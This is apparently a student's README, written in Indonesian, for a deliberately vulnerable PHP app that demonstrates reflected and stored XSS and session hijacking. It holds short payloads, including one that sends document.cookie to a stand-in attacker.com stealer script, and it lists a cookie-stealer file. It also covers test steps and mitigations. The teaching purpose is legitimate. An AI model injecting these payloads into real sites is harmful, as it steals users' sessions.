# Pembuktian XSS (Cross-Site Scripting)

## 📋 Deskripsi
Repository ini berisi implementasi dan demonstrasi kerentanan XSS (Cross-Site Scripting) untuk tujuan edukasi keamanan siber. Proyek ini menunjukkan berbagai jenis serangan XSS dan cara mengeksploitasinya.

## ⚠️ Disclaimer
**PERINGATAN**: Kode dalam repository ini dibuat untuk tujuan edukasi dan penelitian keamanan siber. Penggunaan untuk tujuan yang tidak sah atau merugikan orang lain adalah **DILARANG** dan melanggar hukum.

## 🎯 Tujuan Pembelajaran
- Memahami konsep kerentanan XSS
- Mengetahui cara kerja serangan XSS
- Belajar mengidentifikasi celah keamanan dalam aplikasi web
- Memahami dampak dari serangan XSS

## 📁 Struktur File

### File Utama
- `index.php` - Halaman utama aplikasi
- `login.php` - Halaman login
- `register.php` - Halaman registrasi
- `config.php` - Konfigurasi database

### File Demonstrasi XSS
- `create_post.php` - Form pembuatan post (vulnerable)
- `view_post.php` - Halaman tampil post (target XSS)
- `add_comment.php` - Fitur komentar (vulnerable)
- `session-hijack.php` - Demonstrasi session hijacking

### File Utilitas
- `cookie-stealer.php` - Script untuk mencuri cookie
- `stolen_cookies.log` - Log cookie yang berhasil dicuri
- `logout.php` - Halaman logout

## 🔍 Jenis XSS yang Didemonstrasikan

### 1. Reflected XSS
Serangan XSS yang langsung direfleksikan pada response tanpa disimpan di server.

**Contoh payload:**
```javascript
<script>alert('XSS Vulnerability Found!')</script>
```

### 2. Stored XSS
Serangan XSS yang disimpan di server (biasanya di database) dan dieksekusi setiap kali halaman dimuat.

**Contoh payload:**
```javascript
<script>
document.location='http://attacker.com/cookie-stealer.php?cookie='+document.cookie
</script>
```

### 3. Session Hijacking
Demonstrasi pengambilan session cookie untuk mengakses akun korban.

**Contoh payload:**
```javascript
<script>
new Image().src="cookie-stealer.php?cookie="+document.cookie;
</script>
```

## 🚀 Cara Menjalankan

### Prasyarat
- XAMPP/WAMP/LAMP server
- PHP 7.4 atau lebih baru
- MySQL/MariaDB
- Web browser

### Langkah Instalasi
1. Clone repository ini ke folder htdocs
```bash
git clone [repository-url] pembuktian-xxs
```

2. Import database (jika ada file SQL)
3. Konfigurasi database di `config.php`
4. Jalankan XAMPP/WAMP
5. Akses melalui browser: `http://localhost/pembuktian-xxs/`

## 🧪 Skenario Testing

### Test 1: Basic XSS Alert
1. Buka halaman `create_post.php`
2. Masukkan payload: `<script>alert('XSS')</script>`
3. Submit form
4. Lihat apakah alert muncul

### Test 2: Cookie Stealing
1. Buka halaman yang vulnerable
2. Inject payload cookie stealer
3. Cek file `stolen_cookies.log`

### Test 3: Session Hijacking
1. Login sebagai user normal
2. Inject payload session hijack
3. Cek apakah session berhasil dicuri

## 📊 Hasil Demonstrasi

### Kerentanan yang Ditemukan
- [ ] Reflected XSS di parameter search
- [ ] Stored XSS di form komentar
- [ ] Session hijacking via cookie stealing
- [ ] DOM-based XSS

### Screenshot
*Tambahkan screenshot hasil testing di sini*

## 🛡️ Mitigasi XSS

### Input Validation
```php
// Sanitasi input
$input = htmlspecialchars($_POST['input'], ENT_QUOTES, 'UTF-8');
```

### Output Encoding
```php
// Encode output
echo htmlentities($data, ENT_QUOTES, 'UTF-8');
```

### Content Security Policy (CSP)
```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'">
```

## 📚 Referensi
- [OWASP XSS Prevention Cheat Sheet](https://owasp.org/www-project-cheat-sheets/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [MDN Web Security](https://developer.mozilla.org/en-US/docs/Web/Security)
- [PortSwigger XSS Tutorial](https://portswigger.net/web-security/cross-site-scripting)

## 👨‍💻 Author
**Nama**: [Dede Syifa Sifriani]  
**NIM**: [312310372]  
**Mata Kuliah**: Keamanan Siber / Web Security  
**Institusi**: [Universitas Pelita Bangsa]

## 📄 License
Proyek ini dibuat untuk tujuan edukasi. Penggunaan harus mematuhi kode etik dan hukum yang berlaku.

---

**⚠️ INGAT**: Selalu gunakan pengetahuan keamanan siber untuk tujuan yang baik dan konstruktif. Ethical hacking is the way!
